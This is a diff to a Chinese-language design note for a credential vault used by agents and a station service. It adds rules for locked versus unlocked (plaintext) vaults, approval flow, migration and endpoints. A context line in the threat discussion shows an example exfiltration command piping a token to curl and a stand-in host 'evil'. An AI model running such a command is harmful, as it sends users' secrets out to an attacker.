@@ -35,6 +35,22 @@
 
 要说清楚的一点：agent 和 station 是**同一个系统用户**。所以「注入环境变量」只防不小心泄漏（打印、写进 transcript、提交进仓库），防不住存心要拿的 agent：它能在命令里 `echo $TOKEN | curl evil`。真正防得住的是代理和 ssh-agent 两种方式，所以它们是默认。要彻底隔开，得让 agent 换一个系统用户运行，这是另一件事，不在这里做。
 
+## 一个库：加锁和不加锁（2026-10-17 用户定）
+
+chat EMBER/1792240320.234000。凭据都放在「密钥」这一个库里；库分加锁和不加锁，跟着 workspace 的安全模式走：
+
+| | 不加锁（没开安全模式） | 加锁（开了安全模式） |
+|---|---|---|
+| 存在哪 | station 上明文（`vault_plain` 表，`station/src/vault/plain.ts`），只走 station 之间的加密连接，cloud 看不到 | 本文其余部分：只有自己的设备解得开 |
+| 适合放 | 订阅、模型 API Key（station 本来就要直接用）；其它密钥能放，但每条标「未加密」并引导去开安全模式 | 全部 |
+| agent 用 | 同样的 `secret_use` → 卡片 → 批准 → `secret_run`；条目的主人在任一客户端点批准（不用指纹，没东西要解封），值由 station 自己读出 | 照旧：app 解封、签名后封给 keeper |
+
+- **不加锁也不加密**：用 station 自己保管的钥匙加密，agent 和 station 是同一个系统用户，钥匙它照样读得到；加密成只有设备解得开，没开安全模式时设备名单由 cloud 说了算，等于半个安全模式。所以不加锁就是明文，防的只是值不出现在 agent 常读的文件里（`config.json`），界面不把它说成安全。
+- **Profile 不搬**：订阅登录和模型 key 仍在 Profile 原来的地方（config.json、profile home），「密钥」页把它们列在最前面、链到 Profile 页；Profile 页照旧。加锁后它们也不进加密库：station 要能随时刷新订阅、用 key 跑模型。
+- **开安全模式后**：明文库不再收新条目（`PUT vault/plain` 只收删除，`vault_locked`），也不再交给 agent；页面显示「N 条密钥尚未加密」，用户点「加密」（`vault.migrate`）由 app 读出每条、写进自己的加密库、再删掉明文。
+- **接口**：station `GET/PUT vault/plain`、`GET vault/plain/item?id=`、`POST vault/plain/grants|denials`（`{request, scope}` / `{request}`，按 credential 的 email 认主人），`GET vault/uses?vault=`（加锁库或 `plain` 的使用记录：已批准或拒绝的申请，带对话标题）；`GET vault/requests` 不再要求锁。事件 `vault-plain`（条目，不含值）。core 把明文库当成 id 为 `plain` 的一个库：`vaults` 带 `plain: true`（或加锁后的 `plainLeft`），`vaultItems`/`vault.*` 照常用，新 topic `vaultUses {workspace, vault, item}`，条目带 `lastUse`。
+- **还没定**：关掉安全模式时，加密库里的条目要不要由 app 解开、写回明文库（现在关掉后加密库就读不到了）。
+
 ## 钥匙
 
 ```
